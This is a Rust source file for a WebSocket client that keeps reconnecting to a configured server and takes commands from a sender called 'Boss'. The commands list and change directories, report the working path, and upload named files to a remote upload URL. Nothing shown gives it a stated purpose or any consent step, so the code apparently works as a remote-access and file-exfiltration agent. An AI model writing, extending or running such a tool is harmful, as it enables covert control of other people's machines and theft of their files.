use futures_util:: {
    StreamExt,
    SinkExt,
    stream:: {
        SplitSink,
        SplitStream
    }};
use tokio::io:: {
    AsyncRead,
    AsyncWrite
};

use tokio_tungstenite:: {
    connect_async,
    tungstenite::Message,
    WebSocketStream
};
use serde_json;
use std::sync::Arc;
use tokio::sync::Mutex;
use tokio::time::sleep;
use tokio::time::Duration;
use rand::Rng;
use serde_json:: {
    Value,
    json
};
use std::fs;
use std::path::PathBuf;
mod utils;


async fn handle_incoming_messages(
    mut read: SplitStream<WebSocketStream<impl AsyncRead + AsyncWrite + Unpin>>,
    write: Arc<Mutex<SplitSink<WebSocketStream<impl AsyncRead + AsyncWrite + Unpin>, Message>>>,
    uid: u64
) {

    while let Some(message) = read.next().await {
        match message {
            Ok(msg) => match msg {
                Message::Text(text) => {

                    // inside your Message::Text(text) => { ... } branch:
                    let json_str: String = serde_json::from_str(&text).unwrap_or(text.clone());
                    let v: serde_json::Value = match serde_json::from_str(&json_str) {
                        Ok(j) => j,
                        Err(e) => {
                            eprintln!("bad json from server: {}", e);
                            continue;
                        }
                    };
                    let cmd = v.get("msg").and_then(|m| m.as_str()).unwrap_or_default();
                    let args: Vec<String> = v.get("args")
                    .and_then(|a| a.as_array())
                    .map(|arr|
                        arr.iter()
                        .filter_map(|it| it.as_str().map(|s| s.to_string()))
                        .collect()
                    ).unwrap_or_default();
                    let sndrid = v.get("user").and_then(|m| m.as_str()).unwrap_or("nn");
                    if sndrid == "Boss" {
                        let mut reply_text = "Unknown command".to_string();
                        match cmd {
                            "naam" => {
                                reply_text = "Markand".to_string();
                            }
                            "cwd" => {
                                match std::env::current_dir() {
                                    Ok(p) => reply_text = p.display().to_string(),
                                    Err(e) => reply_text = format!("Error getting cwd: {}", e),
                                }
                            }
                            "cd" => {
                                // args[0] is the directory to change into
                                if let Some(dir) = args.get(0) {
                                    let path = PathBuf::from(dir);
                                    if std::path::Path::new(dir).is_dir() {
                                        match std::env::set_current_dir(&path) {
                                            Ok(_) => {
                                                match std::env::current_dir() {
                                                    Ok(p) => reply_text = format!("Changed dir to {}", p.display()),
                                                    Err(e) => reply_text = format!("Changed but can't read cwd: {}", e),
                                                }
                                            }
                                            Err(e) => reply_text = format!("Failed to change dir: {}", e),
                                        }
                                    } else {
                                        reply_text = format!("{} ek file hai", dir);
                                    }
                                } else {
                                    reply_text = "cd requires a directory argument".to_string();
                                }
                            }
                            "dedo" => {
                                if let Some(bhejene_walifile) = args.get(0) {
                                    let current_dir = std::env::current_dir().unwrap();
                                    let full_path = current_dir.join(bhejene_walifile);
                                    if let Some(full_path_str) = full_path.to_str() {
                                        if let Ok(url) = utils::getdata("upload_url") {
                                            match utils::upload(full_path_str, &(url+"/upload/"), uid) {
                                                Ok(_) => {
                                                    reply_text = format!("uploaded safal: {}",bhejene_walifile);
                                                }
                                                Err(_) => {
                                                    reply_text = "upload failed or file not found".to_string();
                                                }
                                            }
                                        }else {
                                            reply_text = "upload url not available".to_string();
                                        }

                                    } else {
                                        reply_text = "invalid file path".to_string();
                                    }

                                }
                            }
                            "ls" => {
                                let mut entries = Vec::new();
                                if let Ok(dir) = std::fs::read_dir(std::env::current_dir().unwrap()) {
                                    for entry in dir {
                                        if let Ok(entry) = entry {
                                            if let Ok(name) = entry.file_name().into_string() {
                                                entries.push(name);
                                            }
                                        }
                                    }
                                }
                                reply_text = serde_json::to_string(&entries).unwrap();
                            }
                            other => {
                                // handle other commands or treat input as free text
                                reply_text = format!("unknown cmd: {}", other);
                            }
                        }
                        bhejo_sandesh(&write, uid, &reply_text).await;
                    }
                }
                Message::Binary(bin) => {
                    match String::from_utf8(bin) {
                        Ok(text) => {
                            println!("Received binary (as text): {}", text);
                        }
                        Err(_) => {
                            println!("Received non-UTF8 binary data");
                        }
                    }
                }
                Message::Ping(_payload) => {}
                Message::Pong(_payload) => {}
                Message::Close(_frame) => {
                    break;
                }
                _ => {}
            },
            Err(e) => {
                eprintln!("Error receiving message: {}", e);
                break;
            }
        }
    }

}


fn getuid()->u64 {
    fn geneuid()->u64 {
        let mut rng = rand::rng();
        let random_number = (rng.random_range(1_00_000..99_99_999)) as u64;
        let data = json!({
            "uid": random_number
        });
        if let Ok(jsonstr) = serde_json::to_string_pretty(&data) {
            let _ = std::fs::write("data.json", jsonstr);
        }
        random_number
    }
    let file_path = std::path::Path::new("data.json");
    let random_number: u64;
    if file_path.exists() {
        match fs::read_to_string(file_path) {
            Ok(data) => {
                if let Ok(json_value) = serde_json::from_str::<Value>(&data) {
                    random_number = json_value.get("uid").and_then(|v| v.as_u64()).unwrap_or(0);
                }else {
                    random_number = geneuid();
                }
            }
            Err(_) => {
                random_number = geneuid();
            }
        }
    }else {
        random_number = geneuid();
    }
    random_number

}

async fn bhejo_sandesh(write: &Arc<Mutex<SplitSink<WebSocketStream<impl AsyncRead + AsyncWrite + Unpin>, Message>>>, uid: u64, sanedsh: &str) {
    let response = serde_json::json!({
        "user": &uid,
        "msg": sanedsh
    });
    let json_string = serde_json::to_string(&response).unwrap_or_else(|e| format!(r#"{{"user":"Client","msg":"json error: {}"}}"#, e));
    let mut writer = write.lock().await;
    if let Err(e) = writer.send(Message::Text(json_string)).await {
        eprintln!("failed to send reply: {}", e);
    }
}


async fn start_ws_loop() {
    let uid = getuid();
    println!("{uid}");
    loop {
        if let Ok(wbskturl) = utils::getdata("websoket_url") {
            match connect_async(wbskturl).await {
                Ok((ws_stream, _)) => {
                    let (write, read) = ws_stream.split();
                    let write = Arc::new(Mutex::new(write));
                    let write_clone = write.clone();
                    let read_handle = tokio::spawn(handle_incoming_messages(read, write_clone, uid));
                    bhejo_sandesh(&write, uid, "Connected").await;
                    let _ = read_handle.await;
                }
                Err(e) => {
                    println!("❌ Failed to connect: {e}");
                    println!("⏳ Retrying in 4 minutes...");
                }
            }
        }

        sleep(Duration::from_secs(220)).await;
    }
}

#[tokio::main]
async fn main() {
    start_ws_loop().await;

}